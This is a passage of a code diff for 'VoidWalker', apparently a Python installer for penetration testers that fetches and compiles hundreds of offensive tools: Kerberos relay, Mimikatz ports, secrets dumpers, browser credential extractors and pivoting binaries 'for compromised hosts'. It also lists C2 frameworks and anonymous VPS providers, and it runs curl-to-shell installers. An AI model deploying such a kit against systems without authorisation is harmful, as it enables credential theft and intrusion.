+            ("Inveigh.exe", "https://github.com/Kevin-Robertson/Inveigh/releases/latest/download/Inveigh.exe"),
+        ],
+        "dest_dir": "tools/windows/inveigh",
+    },
+    "krbrelayup": {
+        "description": "Kerberos relay privilege escalation",
+        "windows": [
+            ("KrbRelayUp.exe", "https://github.com/Dec0ne/KrbRelayUp/releases/latest/download/KrbRelayUp.exe"),
+        ],
+        "dest_dir": "tools/windows/kerberos",
+    },
+}
+
+# Python tools installed exclusively via UV (astral.sh)
+# These are removed from PIPX_TOOLS to avoid double-install
+UV_TOOLS = [
+    "impacket",
+    "bloodyad",
+    "certipy-ad",
+    "netexec",
+]
+
+# ── Sources, Guides & Cheatsheets ────────────────────────────────────────────
+# Non-tool references: curated link collections, cheatsheets, guides,
+# commercial tool references, anonymous VPS providers, and learning resources.
+SOURCES_AND_GUIDES = {
+    "Reference Repositories": [
+        ("maldev-links (curated)", "https://github.com/CodeXTF2/maldev-links"),
+        ("RedTeam-Tools (A-poc)", "https://github.com/A-poc/RedTeam-Tools"),
+        ("PayloadsAllTheThings", "https://github.com/swisskyrepo/PayloadsAllTheThings"),
+        ("PentestTools (arch3rPro)", "https://github.com/arch3rPro/PentestTools"),
+        ("atomic-red-team", "https://github.com/redcanaryco/atomic-red-team"),
+        ("HackTricks", "https://book.hacktricks.xyz/"),
+        ("HackTricks-Cloud", "https://cloud.hacktricks.xyz/"),
+        ("LOLBAS Project", "https://lolbas-project.github.io/"),
+        ("GTFOBins", "https://gtfobins.github.io/"),
+        ("WADComs", "https://wadcoms.github.io/"),
+        ("The Hacker Recipes", "https://www.thehacker.recipes/"),
+        ("ired.team notes", "https://www.ired.team/"),
+        ("OSCP-Cheatsheet", "https://github.com/0xsyr0/OSCP"),
+    ],
+    "AD Enumeration & Recon": [
+        ("ldapdomaindump", "https://github.com/dirkjanm/ldapdomaindump"),
+        ("linWinPwn", "https://github.com/lefayjey/linWinPwn"),
+        ("PCredz", "https://github.com/lgandx/PCredz"),
+        ("scavenger", "https://github.com/SpiderLabs/scavenger"),
+        ("adidnsdump", "https://github.com/dirkjanm/adidnsdump"),
+        ("EyeWitness", "https://github.com/RedSiege/EyeWitness"),
+        ("Chimera (PS obfuscator)", "https://github.com/tokyoneon/Chimera"),
+        ("WMIOps", "https://github.com/FortyNorthSecurity/WMIOps"),
+    ],
+    "SCCM Attack Tooling": [
+        ("Misconfiguration-Manager", "https://github.com/subat0mik/Misconfiguration-Manager"),
+        ("sccmhunter", "https://github.com/garrettfoster13/sccmhunter"),
+        ("SharpSCCM", "https://github.com/Mayyhem/SharpSCCM"),
+    ],
+    "Metasploit Modules (ADCS)": [
+        ("esc_update_ldap_object", "https://github.com/rapid7/metasploit-framework/blob/master/modules/auxiliary/admin/ldap/esc_update_ldap_object.rb"),
+        ("ldap_esc_vulnerable_template", "https://github.com/rapid7/metasploit-framework/blob/master/modules/auxiliary/gather/ldap_esc_vulnerable_cert_finder.rb"),
+    ],
+    "Commercial C2 Frameworks": [
+        ("Cobalt Strike", "https://www.cobaltstrike.com/"),
+        ("Nighthawk (MDSec)", "https://www.mdsec.co.uk/nighthawk/"),
+        ("Brute Ratel C4", "https://bruteratel.com/"),
+        ("Pentera", "https://pentera.io/"),
+    ],
+    "Maldev Learning": [
+        ("Maldev Academy (course)", "https://maldevacademy.com/"),
+        ("Maldev Academy Code Search", "https://search.maldevacademy.com/"),
+        ("Malforge Group", "https://malforge-group.in/"),
+        ("oioio-space/maldev (Go lib)", "https://github.com/oioio-space/maldev"),
+        ("0xbekoo/maldev", "https://github.com/0xbekoo/maldev"),
+    ],
+    "Anonymous VPS Providers": [
+        ("RamNode", "https://www.ramnode.com/"),
+        ("NiceVPS", "https://nicevps.net/"),
+        ("Cinfu", "https://www.cinfu.com/"),
+        ("PiVPS", "https://pivps.com/"),
+        ("SecureDragon", "https://securedragon.net/"),
+        ("BitLaunch", "https://bitlaunch.io/"),
+        ("BitHost", "https://bithost.io/"),
+    ],
+    "Chrome / Browser Extraction": [
+        ("ChromeKatz", "https://github.com/Meckazin/ChromeKatz"),
+        ("ChromElevator (ABE Decryption)", "https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption"),
+        ("chrome_v20_decryption", "https://github.com/runassu/chrome_v20_decryption"),
+        ("chrome_v20_password_dump", "https://github.com/nicehash/chrome_v20_password_dump.py"),
+        ("chrome-bypass (ABE v20 PoC)", "https://github.com/nicehash/chrome-bypass"),
+        ("ChromeDumper", "https://github.com/nicehash/ChromeDumper"),
+        ("HackBrowserData", "https://github.com/moonD4rk/HackBrowserData"),
+        ("ChromePass (NirSoft)", "https://www.nirsoft.net/utils/chromepass.html"),
+    ],
+}
+
+# ── C# Build Targets ────────────────────────────────────────────────────────
+# Tools to compile from source using `dotnet build`.
+# Each entry: { repo, framework, type (sln|csproj), description }
+# Source repos are cloned into ~/voidwalker/tools/build-src/
+# Compiled binaries output to ~/voidwalker/tools/windows/compiled/
+BUILD_TARGETS = {
+    "Rubeus": {
+        "repo": "https://github.com/GhostPack/Rubeus.git",
+        "framework": "net462",
+        "type": "sln",
+        "description": "Kerberos abuse toolkit",
+    },
+    "Seatbelt": {
+        "repo": "https://github.com/GhostPack/Seatbelt.git",
+        "framework": "net462",
+        "type": "sln",
+        "description": "Security enumeration",
+    },
+    "Certify": {
+        "repo": "https://github.com/GhostPack/Certify.git",
+        "framework": "net462",
+        "type": "sln",
+        "description": "ADCS enumeration & abuse",
+    },
+    "SharpUp": {
+        "repo": "https://github.com/GhostPack/SharpUp.git",
+        "framework": "net462",
+        "type": "sln",
+        "description": "Privilege escalation checks",
+    },
+    "SharpDPAPI": {
+        "repo": "https://github.com/GhostPack/SharpDPAPI.git",
+        "framework": "net462",
+        "type": "sln",
+        "description": "DPAPI secrets extraction",
+    },
+    "ForgeCert": {
+        "repo": "https://github.com/GhostPack/ForgeCert.git",
+        "framework": "net462",
+        "type": "sln",
+        "description": "Certificate forgery",
+    },
+    "SharpWMI": {
+        "repo": "https://github.com/GhostPack/SharpWMI.git",
+        "framework": "net462",
+        "type": "sln",
+        "description": "WMI execution & lateral movement",
+    },
+    "KrbRelay": {
+        "repo": "https://github.com/cube0x0/KrbRelay.git",
+        "framework": "net462",
+        "type": "sln",
+        "description": "Kerberos relay attacks",
+    },
+    "KrbRelayUp": {
+        "repo": "https://github.com/Dec0ne/KrbRelayUp.git",
+        "framework": "net462",
+        "type": "sln",
+        "description": "Kerberos relay privilege escalation",
+    },
+    "ADSearch": {
+        "repo": "https://github.com/tomcarver16/ADSearch.git",
+        "framework": "net462",
+        "type": "sln",
+        "description": "AD enumeration via LDAP",
+    },
+    "StandIn": {
+        "repo": "https://github.com/FuzzySecurity/StandIn.git",
+        "framework": "net462",
+        "type": "sln",
+        "description": "AD post-compromise toolkit",
+    },
+    "Whisker": {
+        "repo": "https://github.com/eladshamir/Whisker.git",
+        "framework": "net462",
+        "type": "sln",
+        "description": "Shadow Credentials attack",
+    },
+    "SharpSploit": {
+        "repo": "https://github.com/cobbr/SharpSploit.git",
+        "framework": "netstandard2.0",
+        "type": "sln",
+        "description": "Post-exploitation library",
+    },
+    "SharpKatz": {
+        "repo": "https://github.com/b4rtik/SharpKatz.git",
+        "framework": "net462",
+        "type": "sln",
+        "description": "C# Mimikatz port (sekurlsa)",
+    },
+    "SharpView": {
+        "repo": "https://github.com/tevora-threat/SharpView.git",
+        "framework": "net462",
+        "type": "sln",
+        "description": "C# port of PowerView",
+    },
+    "SharPersist": {
+        "repo": "https://github.com/mandiant/SharPersist.git",
+        "framework": "net462",
+        "type": "sln",
+        "description": "Persistence toolkit",
+    },
+    "SharpSecDump": {
+        "repo": "https://github.com/G0ldenGunSec/SharpSecDump.git",
+        "framework": "net462",
+        "type": "sln",
+        "description": "Remote SAM + LSA secrets dump",
+    },
+    "SQLRecon": {
+        "repo": "https://github.com/skahwah/SQLRecon.git",
+        "framework": "net6.0",
+        "type": "csproj",
+        "description": "SQL Server post-exploitation",
+    },
+    "Snaffler": {
+        "repo": "https://github.com/SnaffCon/Snaffler.git",
+        "framework": "net462",
+        "type": "sln",
+        "description": "Credential hunting across shares",
+    },
+    "InternalMonologue": {
+        "repo": "https://github.com/eladshamir/Internal-Monologue.git",
+        "framework": "net462",
+        "type": "sln",
+        "description": "NetNTLM hash extraction",
+    },
+    "SpoolSample": {
+        "repo": "https://github.com/leechristensen/SpoolSample.git",
+        "framework": "net462",
+        "type": "sln",
+        "description": "Print spooler coercion",
+    },
+    # SharpCollection Nightly Roster additions
+    "ADCollector": {
+        "repo": "https://github.com/dev-2null/ADCollector.git",
+        "framework": "net462",
+        "type": "sln",
+        "description": "AD enumeration & data collector",
+    },
+    "ADCSPwn": {
+        "repo": "https://github.com/bats3c/ADCSPwn.git",
+        "framework": "net462",
+        "type": "sln",
+        "description": "ADCS ESC1 exploitation",
+    },
+    "ADFSDump": {
+        "repo": "https://github.com/mandiant/ADFSDump.git",
+        "framework": "net462",
+        "type": "sln",
+        "description": "ADFS configuration dumper",
+    },
+    "AtYourService": {
+        "repo": "https://github.com/mitchmoser/AtYourService.git",
+        "framework": "net462",
+        "type": "sln",
+        "description": "Service enumeration across domain",
+    },
+    "BetterSafetyKatz": {
+        "repo": "https://github.com/Flangvik/BetterSafetyKatz.git",
+        "framework": "net462",
+        "type": "sln",
+        "description": "Dynamic Mimikatz loader via DInvoke",
+    },
+    "EDD": {
+        "repo": "https://github.com/FortyNorthSecurity/EDD.git",
+        "framework": "net462",
+        "type": "sln",
+        "description": "Enumerate Domain Data",
+    },
+    "PassTheCert": {
+        "repo": "https://github.com/AlmondOffSec/PassTheCert.git",
+        "framework": "net462",
+        "type": "sln",
+        "description": "Certificate-based authentication abuse",
+    },
+    "PurpleSharp": {
+        "repo": "https://github.com/mvelazc0/PurpleSharp.git",
+        "framework": "net462",
+        "type": "sln",
+        "description": "Adversary simulation tool",
+    },
+    "SafetyKatz": {
+        "repo": "https://github.com/GhostPack/SafetyKatz.git",
+        "framework": "net462",
+        "type": "sln",
+        "description": "Safe Mimikatz via minidump",
+    },
+    "SauronEye": {
+        "repo": "https://github.com/vivami/SauronEye.git",
+        "framework": "net462",
+        "type": "sln",
+        "description": "File share search tool",
+    },
+    "SearchOutlook": {
+        "repo": "https://github.com/RedLectroid/SearchOutlook.git",
+        "framework": "net462",
+        "type": "sln",
+        "description": "Outlook email search",
+    },
+    "SharpAllowedToAct": {
+        "repo": "https://github.com/pkb1s/SharpAllowedToAct.git",
+        "framework": "net462",
+        "type": "sln",
+        "description": "RBCD exploitation",
+    },
+    "SharpChrome": {
+        "repo": "https://github.com/GhostPack/SharpDPAPI.git",
+        "framework": "net462",
+        "type": "sln",
+        "description": "Chrome credential extraction",
+    },
+    "SharpHound": {
+        "repo": "https://github.com/BloodHoundAD/SharpHound.git",
+        "framework": "net462",
+        "type": "sln",
+        "description": "BloodHound AD collector",
+    },
+    "SharpSCCM": {
+        "repo": "https://github.com/Mayyhem/SharpSCCM.git",
+        "framework": "net462",
+        "type": "sln",
+        "description": "SCCM recon & abuse",
+    },
+    "RunAs": {
+        "repo": "https://github.com/Flangvik/SharpCollection.git",
+        "framework": "net462",
+        "type": "sln",
+        "description": "Run process as another user",
+    },
+    "scout": {
+        "repo": "https://github.com/jaredhaight/scout.git",
+        "framework": "net462",
+        "type": "sln",
+        "description": "AD recon & graph builder",
     },
 }
 
@@ -688,9 +1425,24 @@ class VoidWalker:
         self.term_height = shutil.get_terminal_size().lines
         self.running = True
         self.base_path = Path.home() / "voidwalker"
+        self.log_file = self.base_path / "voidwalker.log"
         self.stats = {"ok": 0, "fail": 0}
+        # OS detection for cross-platform support
+        self.platform = sys.platform  # "darwin" or "linux"
+        self.is_macos = self.platform == "darwin"
+        self.is_linux = self.platform.startswith("linux")
         signal.signal(signal.SIGINT, self.signal_handler)
         signal.signal(signal.SIGTERM, self.signal_handler)
+
+    def log(self, message: str):
+        """Append a message to the log file with a timestamp."""
+        try:
+            self.base_path.mkdir(parents=True, exist_ok=True)
+            timestamp = time.strftime("%Y-%m-%d %H:%M:%S")
+            with open(self.log_file, "a", encoding="utf-8") as f:
+                f.write(f"[{timestamp}] {message}\n")
+        except Exception:
+            pass
 
     def signal_handler(self, sig, frame):
         self.running = False
@@ -891,7 +1643,8 @@ class VoidWalker:
         self.print_centered(subtitle)
         print()
         
-        tagline = f"{Colors.GRAY}[ {Colors.NEON_CYAN}250+ Security Tools for Ubuntu/Debian {Colors.GRAY}]{Colors.RESET}"
+        platform_tag = "Linux & macOS" if sys.platform == "darwin" else "Linux & macOS"
+        tagline = f"{Colors.GRAY}[ {Colors.NEON_CYAN}300+ Security Tools for {platform_tag} {Colors.GRAY}]{Colors.RESET}"
         self.print_centered(tagline)
         print()
 
@@ -938,11 +1691,14 @@ class VoidWalker:
     def show_main_menu(self) -> str:
         print()
         menu_items = [
-            (f"{Symbols.ROCKET}", "Install Full Arsenal (250+ tools)", "full"),
+            (f"{Symbols.ROCKET}", "Install Full Arsenal (350+ tools)", "full"),
             (f"{Symbols.GEAR}", "Select Categories", "categories"),
             (f"{Symbols.STAR}", "View All Tools", "list"),
-            (f"{Symbols.CHECK}", "APT/PIPX Tools Only", "apt"),
+            (f"{Symbols.CHECK}", "System Packages (apt/brew)", "apt"),
             (f"{Symbols.DIAMOND}", "Windows Binaries Only", "windows"),
+            (f"{Symbols.LIGHTNING}", "Build C# Tools from Source", "build"),
+            (f"{Symbols.SHIELD}", "Setup Pentest Obsidian Vault", "vault"),
+            (f"{Symbols.SHIELD}", "View Sources & Guides", "sources"),
             (f"{Symbols.CROSS}", "Exit", "exit"),
         ]
         
@@ -1016,9 +1772,33 @@ class VoidWalker:
             
             if 'repos' in data:
                 print(f"    {Colors.YELLOW}+ {len(data['repos'])} Git repositories{Colors.RESET}")
-        
+
+        # Sources, Guides & References
+        print(f"\n  {Colors.NEON_MAGENTA}{Symbols.SHIELD} Sources, Guides & Cheatsheets{Colors.RESET}")
+        print(f"  {Colors.GRAY}{'─' * 60}{Colors.RESET}")
+        for section, entries in SOURCES_AND_GUIDES.items():
+            print(f"    {Colors.NEON_CYAN}{Symbols.ARROW_RIGHT}{Colors.RESET} {Colors.WHITE}{section}{Colors.RESET} {Colors.GRAY}({len(entries)} entries){Colors.RESET}")
+
         print()
         input(f"{Colors.GRAY}Press Enter to continue...{Colors.RESET}")
+
+    def show_sources(self):
+        self.clear_screen()
+        self.show_ascii_banner()
+        print()
+        self.print_centered(f"{Colors.NEON_MAGENTA}{Symbols.SHIELD} SOURCES, GUIDES & CHEATSHEETS {Symbols.SHIELD}{Colors.RESET}")
+        self.print_centered(f"{Colors.GRAY}{'─' * 60}{Colors.RESET}")
+        print()
+        
+        for section, entries in SOURCES_AND_GUIDES.items():
+            print(f"  {Colors.NEON_MAGENTA}{Symbols.DIAMOND} {section}{Colors.RESET}")
+            print(f"  {Colors.GRAY}{'─' * 60}{Colors.RESET}")
+            for name, url in entries:
+                print(f"    {Colors.NEON_CYAN}{Symbols.ARROW_RIGHT}{Colors.RESET} {Colors.WHITE}{name:40}{Colors.RESET}")
+                print(f"      {Colors.ELECTRIC_BLUE}{url}{Colors.RESET}")
+            print()
+            
+        input(f"{Colors.GRAY}Press Enter to return to main menu...{Colors.RESET}")
 
     def show_installation_preview(self, categories: List[str]) -> bool:
         self.clear_screen()
@@ -1079,55 +1859,233 @@ class VoidWalker:
         except EOFError:
             return False
 
-    def download_file(self, url: str, dest: Path, timeout: int = 120) -> bool:
-        try:
-            dest.parent.mkdir(parents=True, exist_ok=True)
-            req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0"})
-            with urllib.request.urlopen(req, timeout=timeout) as resp:
-                with open(dest, 'wb') as f:
-                    f.write(resp.read())
-            if dest.suffix in ['', '.sh', '.py']:
-                dest.chmod(0o755)
+    def download_file(self, url: str, dest: Path, timeout: int = 120, max_retries: int = 3) -> bool:
+        if dest.exists() and dest.stat().st_size > 0:
+            self.log(f"Skipped existing file: {dest}")
             return True
-        except Exception:
-            return False
 
-    def download_and_extract_zip(self, url: str, dest: Path, timeout: int = 120) -> bool:
-        try:
-            dest.mkdir(parents=True, exist_ok=True)
-            with tempfile.NamedTemporaryFile(suffix='.zip', delete=False) as tmp:
+        for attempt in range(max_retries):
+            try:
+                dest.parent.mkdir(parents=True, exist_ok=True)
                 req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0"})
                 with urllib.request.urlopen(req, timeout=timeout) as resp:
-                    tmp.write(resp.read())
-                tmp_path = tmp.name
-            
-            with zipfile.ZipFile(tmp_path, 'r') as zf:
-                zf.extractall(dest)
-            os.unlink(tmp_path)
-            return True
-        except Exception:
-            return False
-
-    def git_clone(self, url: str, dest: Path, timeout: int = 120) -> bool:
-        try:
-            if dest.exists():
+                    with open(dest, 'wb') as f:
+                        f.write(resp.read())
+                if dest.suffix in ['', '.sh', '.py']:
+                    dest.chmod(0o755)
+                self.log(f"Successfully downloaded {url} to {dest}")
                 return True
-            dest.parent.mkdir(parents=True, exist_ok=True)
-            result = subprocess.run(
-                ["git", "clone", "--depth=1", url, str(dest)],
-                capture_output=True,
-                timeout=timeout
-            )
-            return result.returncode == 0
-        except Exception:
-            return False
+            except Exception as e:
+                self.log(f"Download failed for {url} (Attempt {attempt+1}/{max_retries}): {str(e)}")
+                if attempt < max_retries - 1:
+                    time.sleep(2 ** attempt)
+        return False
+
+    def download_and_extract_zip(self, url: str, dest: Path, timeout: int = 120, max_retries: int = 3) -> bool:
+        if dest.exists() and any(dest.iterdir()):
+            self.log(f"Skipped existing directory: {dest}")
+            return True
+
+        for attempt in range(max_retries):
+            try:
+                dest.mkdir(parents=True, exist_ok=True)
+                with tempfile.NamedTemporaryFile(suffix='.zip', delete=False) as tmp:
+                    req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0"})
+                    with urllib.request.urlopen(req, timeout=timeout) as resp:
+                        tmp.write(resp.read())
+                    tmp_path = tmp.name
+                
+                with zipfile.ZipFile(tmp_path, 'r') as zf:
+                    zf.extractall(dest)
+                os.unlink(tmp_path)
+                self.log(f"Successfully downloaded and extracted {url} to {dest}")
+                return True
+            except Exception as e:
+                self.log(f"ZIP Download failed for {url} (Attempt {attempt+1}/{max_retries}): {str(e)}")
+                if attempt < max_retries - 1:
+                    time.sleep(2 ** attempt)
+        return False
+
+    def git_clone(self, url: str, dest: Path, timeout: int = 120, max_retries: int = 3) -> bool:
+        if (dest / ".git").exists():
+            try:
+                subprocess.run(["git", "-C", str(dest), "pull", "--ff-only"], capture_output=True, timeout=timeout)
+                self.log(f"Updated existing repo: {dest}")
+                return True
+            except Exception as e:
+                self.log(f"Failed to pull existing repo {dest}: {str(e)}")
+                return False
+        elif dest.exists():
+            self.log(f"Skipped existing directory without .git: {dest}")
+            return True
+
+        for attempt in range(max_retries):
+            try:
+                dest.parent.mkdir(parents=True, exist_ok=True)
+                result = subprocess.run(
+                    ["git", "clone", "--depth=1", url, str(dest)],
+                    capture_output=True,
+                    timeout=timeout
+                )
+                if result.returncode == 0:
+                    self.log(f"Successfully cloned {url} to {dest}")
+                    return True
+                else:
+                    self.log(f"Clone failed for {url} (Attempt {attempt+1}/{max_retries}): {result.stderr.decode(errors='ignore')}")
+            except Exception as e:
+                self.log(f"Clone exception for {url} (Attempt {attempt+1}/{max_retries}): {str(e)}")
+            
+            if attempt < max_retries - 1:
+                time.sleep(2 ** attempt)
+        return False
 
     def run_cmd(self, cmd: List[str], timeout: int = 300) -> bool:
         try:
             result = subprocess.run(cmd, capture_output=True, timeout=timeout)
+            if result.returncode != 0:
+                self.log(f"Command failed: {' '.join(cmd)}\nStderr: {result.stderr.decode(errors='ignore')}")
             return result.returncode == 0
-        except Exception:
+        except Exception as e:
+            self.log(f"Command exception: {' '.join(cmd)}\nError: {str(e)}")
             return False
+
+    def install_system_tools(self):
+        """Route to the correct OS-specific package installer."""
+        if self.is_macos:
+            self.install_brew_tools()
+        else:
+            self.install_apt_tools()
+
+    def install_brew_tools(self):
+        """Install system packages on macOS via Homebrew."""
+        self.clear_screen()
+        self.show_ascii_banner()
+
+        print()
+        self.print_centered(f"{Colors.NEON_MAGENTA}{Symbols.ROCKET} INSTALLING SYSTEM PACKAGES (macOS/Homebrew) {Symbols.ROCKET}{Colors.RESET}")
+        self.print_centered(f"{Colors.GRAY}{'─' * 60}{Colors.RESET}")
+        print()
+
+        # Ensure Homebrew is installed
+        brew_check = subprocess.run(["which", "brew"], capture_output=True)
+        if brew_check.returncode != 0:
+            print(f"  {Colors.YELLOW}Homebrew not found — installing...{Colors.RESET}")
+            self.run_cmd(["bash", "-c",
+                '/bin/bash -c "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)"'])
+        else:
+            print(f"  {Colors.NEON_GREEN}{Symbols.CHECK} Homebrew detected{Colors.RESET}")
+
+        # Update Homebrew
+        done_event = threading.Event()
+        spinner_thread = threading.Thread(
+            target=self.spinner_animation,
+            args=("Updating Homebrew...", done_event)
+        )
+        spinner_thread.start()
+        self.run_cmd(["brew", "update"])
+        done_event.set()
+        spinner_thread.join()
+        print(f"  {Colors.NEON_GREEN}{Symbols.CHECK}{Colors.RESET} {Colors.WHITE}Homebrew updated{Colors.RESET}")
+        print()
+
+        # Install brew formulae
+        brew_success, brew_fail = 0, 0
+        total_brew = len(BREW_TOOLS)
+
+        for i, tool in enumerate(BREW_TOOLS, 1):
+            self.show_live_status("Brew Formulae", i, total_brew, tool, "downloading")
+            if self.run_cmd(["brew", "install", tool]):
+                brew_success += 1
+                self.stats["ok"] += 1
+            else:
+                brew_fail += 1
+                self.stats["fail"] += 1
+
+        self.complete_status_line("Brew Formulae", brew_success, brew_fail)
+        print()
+
+        # Install brew casks
+        cask_success, cask_fail = 0, 0
+        total_cask = len(BREW_CASKS)
+
+        for i, cask in enumerate(BREW_CASKS, 1):
+            self.show_live_status("Brew Casks", i, total_cask, cask, "downloading")
+            if self.run_cmd(["brew", "install", "--cask", cask]):
+                cask_success += 1
+                self.stats["ok"] += 1
+            else:
+                cask_fail += 1
+                self.stats["fail"] += 1
+
+        self.complete_status_line("Brew Casks", cask_success, cask_fail)
+        print()
+
+        # Ensure pipx is available
+        self.run_cmd(["pipx", "ensurepath"])
+
+        # PIPX tools
+        pipx_success, pipx_fail = 0, 0
+        total_pipx = len(PIPX_TOOLS)
+
+        for i, tool in enumerate(PIPX_TOOLS, 1):
+            self.show_live_status("PIPX Tools", i, total_pipx, tool, "downloading")
+            if self.run_cmd(["pipx", "install", tool]):
+                pipx_success += 1
+                self.stats["ok"] += 1
+            else:
+                pipx_fail += 1
+
+        self.complete_status_line("PIPX Tools", pipx_success, pipx_fail)
+        print()
+
+        # UV tools
+        self.install_uv_tools()
+
+        # Go tools (brew installs go already)
+        go_success, go_fail = 0, 0
+        total_go = len(GO_TOOLS)
+        os.environ["GOPATH"] = str(Path.home() / "go")
+        os.environ["PATH"] = os.environ.get("PATH", "") + ":" + str(Path.home() / "go" / "bin")
+
+        for i, (name, cmd) in enumerate(GO_TOOLS, 1):
+            self.show_live_status("Go Tools", i, total_go, name, "downloading")
+            if cmd.startswith("go install"):
+                if self.run_cmd(cmd.split()):
+                    go_success += 1
+                    self.stats["ok"] += 1
+                else:
+                    go_fail += 1
+                    self.stats["fail"] += 1
+            # Skip .deb files on macOS
+            elif cmd.endswith(".deb"):
+                go_fail += 1
+                self.stats["fail"] += 1
+
+        self.complete_status_line("Go Tools", go_success, go_fail)
+        print()
+
+        # Ruby Gems
+        gem_success, gem_fail = 0, 0
+        total_gem = len(GEM_TOOLS)
+        if total_gem > 0:
+            for i, tool in enumerate(GEM_TOOLS, 1):
+                self.show_live_status("Ruby Gems", i, total_gem, tool, "downloading")
+                if self.run_cmd(["gem", "install", tool]):
+                    gem_success += 1
+                    self.stats["ok"] += 1
+                else:
+                    gem_fail += 1
+                    self.stats["fail"] += 1
+            self.complete_status_line("Ruby Gems", gem_success, gem_fail)
+            print()
+
+        # Cross-Platform Tools (all three platforms)
+        self.install_cross_platform_tools()
+
+        # Shell aliases (zsh on macOS)
+        self.create_shell_aliases()
+
+        self.show_summary()
 
     def install_apt_tools(self):
         self.clear_screen()
@@ -1180,6 +2138,9 @@ class VoidWalker:
         
         self.complete_status_line("PIPX Tools", pipx_success, pipx_fail)
         print()
+
+        # Install UV and UV-managed Python tools
+        self.install_uv_tools()
         
         go_success, go_fail = 0, 0
         total_go = len(GO_TOOLS)
@@ -1226,7 +2187,7 @@ class VoidWalker:
             self.complete_status_line("Ruby Gems", gem_success, gem_fail)
             print()
 
-        # Install Special Tools (kerbrute, ligolo-ng, chisel)
+        # Install Special Tools (kerbrute)
         special_success, special_fail = 0, 0
         total_special = len(SPECIAL_TOOLS)
 
@@ -1242,6 +2203,9 @@ class VoidWalker:
 
             self.complete_status_line("Special Tools", special_success, special_fail)
             print()
+
+        # Install Cross-Platform Tools (chisel, ligolo-ng, fscan — both Windows & Linux)
+        self.install_cross_platform_tools()
 
         # Extract rockyou.txt if it exists
         self.extract_rockyou()
@@ -1298,6 +2262,157 @@ class VoidWalker:
         except Exception as e:
             return False
 
+    def install_uv_tools(self):
+        """Install UV package manager and UV-managed Python security tools."""
+        print(f"  {Colors.YELLOW}Installing UV package manager...{Colors.RESET}")
+
+        # Install UV via official installer
+        uv_installed = self.run_cmd(
+            ["bash", "-c", "curl -LsSf https://astral.sh/uv/install.sh | sh"]
+        )
+        if uv_installed:
+            print(f"  {Colors.NEON_GREEN}{Symbols.CHECK} UV installed{Colors.RESET}")
+        else:
+            # Fallback: try pipx
+            uv_installed = self.run_cmd(["pipx", "install", "uv"])
+            if uv_installed:
+                print(f"  {Colors.NEON_GREEN}{Symbols.CHECK} UV installed via pipx{Colors.RESET}")
+            else:
+                print(f"  {Colors.BRIGHT_RED}{Symbols.CROSS} UV installation failed — skipping UV tools{Colors.RESET}")
+                return
+
+        # Ensure UV is on PATH
+        uv_bin = Path.home() / ".local" / "bin"
+        if str(uv_bin) not in os.environ.get("PATH", ""):
+            os.environ["PATH"] = str(uv_bin) + ":" + os.environ.get("PATH", "")
+
+        uv_success, uv_fail = 0, 0
+        total_uv = len(UV_TOOLS)
+
+        for i, tool in enumerate(UV_TOOLS, 1):
+            self.show_live_status("UV Tools", i, total_uv, tool, "downloading")
+            if self.run_cmd(["uv", "tool", "install", tool]):
+                uv_success += 1
+                self.stats["ok"] += 1
+            else:
+                uv_fail += 1
+                self.stats["fail"] += 1
+
+        self.complete_status_line("UV Tools", uv_success, uv_fail)
+        print()
+
+    def install_cross_platform_tools(self):
+        """Download both Windows and Linux binaries for cross-platform tools.
+
+        These are binaries you transfer to compromised hosts (chisel, ligolo-ng, fscan).
+        Each tool gets a Windows and Linux subdirectory with the appropriate binaries.
+        """
+        total_items = sum(
+            len(cfg.get("windows", [])) + len(cfg.get("linux", [])) + len(cfg.get("darwin", []))
+            for cfg in CROSS_PLATFORM_TOOLS.values()
+        )
+
+        if total_items == 0:
+            return
+
+        xp_success, xp_fail = 0, 0
+        counter = 0
+
+        for tool_name, cfg in CROSS_PLATFORM_TOOLS.items():
+            for platform, binaries in [("windows", cfg.get("windows", [])),
+                                        ("linux", cfg.get("linux", [])),
+                                        ("darwin", cfg.get("darwin", []))]:
+                # Determine destination directory
+                if platform == "windows":
+                    dest_key = cfg.get("dest_dir_win", cfg.get("dest_dir", f"tools/pivoting/{tool_name}"))
+                elif platform == "darwin":
+                    dest_key = cfg.get("dest_dir_darwin", cfg.get("dest_dir", f"tools/pivoting/{tool_name}"))
+                else:
+                    dest_key = cfg.get("dest_dir_linux", cfg.get("dest_dir", f"tools/pivoting/{tool_name}"))
+
+                dest_dir = self.base_path / dest_key / platform
+
+                for filename, url in binaries:
+                    counter += 1
+                    display_name = f"{tool_name}/{platform}/{filename}"
+                    self.show_live_status("Cross-Platform", counter, total_items, display_name[:30], "downloading")
+
+                    dest_file = dest_dir / filename
+                    dest_file.parent.mkdir(parents=True, exist_ok=True)
+
+                    success = False
+
+                    if url.endswith(".tar.gz"):
+                        # Download and extract tar.gz
+                        success = self._download_and_extract_tar_gz(url, dest_dir, tool_name)
+                    elif url.endswith(".gz"):
+                        # Download and decompress single .gz file
+                        success = self._download_and_decompress_gz(url, dest_file)
+                    elif url.endswith(".zip"):
+                        # Download and extract zip
+                        success = self.download_and_extract_zip(url, dest_dir)
+                    else:
+                        # Direct binary download
+                        success = self.download_file(url, dest_file)
+
+                    if success:
+                        # Set executable permission for Linux binaries
+                        if platform == "linux" and dest_file.exists():
+                            dest_file.chmod(0o755)
+                        xp_success += 1
+                        self.stats["ok"] += 1
+                    else:
+                        xp_fail += 1
+                        self.stats["fail"] += 1
+
+        self.complete_status_line("Cross-Platform", xp_success, xp_fail)
+        print()
+
+    def _download_and_extract_tar_gz(self, url: str, dest_dir: Path, tool_name: str) -> bool:
+        """Download a .tar.gz archive and extract all files into dest_dir."""
+        try:
+            dest_dir.mkdir(parents=True, exist_ok=True)
+            with tempfile.NamedTemporaryFile(suffix='.tar.gz', delete=False) as tmp:
+                req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0"})
+                with urllib.request.urlopen(req, timeout=120) as resp:
+                    tmp.write(resp.read())
+                tmp_path = Path(tmp.name)
+
+            with tarfile.open(tmp_path, 'r:gz') as tar:
+                for member in tar.getmembers():
+                    if member.isfile():
+                        member.name = Path(member.name).name  # flatten path
+                        tar.extract(member, dest_dir)
+                        extracted = dest_dir / member.name
+                        if extracted.exists():
+                            extracted.chmod(0o755)
+
+            tmp_path.unlink(missing_ok=True)
+            return True
+        except Exception:
+            return False
+
+    def _download_and_decompress_gz(self, url: str, dest_file: Path) -> bool:
